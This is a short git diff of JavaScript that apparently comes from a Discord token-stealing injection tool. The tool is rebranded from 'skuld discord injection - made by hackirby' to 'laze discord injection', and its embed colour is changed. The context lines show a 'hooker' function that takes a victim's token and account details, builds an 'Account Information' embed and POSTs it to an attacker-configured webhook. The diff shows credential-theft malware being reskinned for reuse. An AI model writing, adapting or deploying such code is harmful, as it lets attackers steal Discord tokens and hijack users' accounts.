@@ -155,7 +155,7 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "skuld discord injection - made by hackirby",
+        "text": "laze discord injection",
         "icon_url": "https://i.ibb.co/hVY5sGg/logo.png",
     };
     content["embeds"][0]["title"] = "Account Information";
@@ -194,7 +194,7 @@ const hooker = async (content, token, account) => {
     });
 
     for (const embed in content["embeds"]) {
-        content["embeds"][embed]["color"] = 0xb143e3;
+        content["embeds"][embed]["color"] = 0x0b37b9;
     }
 
     await request("POST", CONFIG.webhook, {
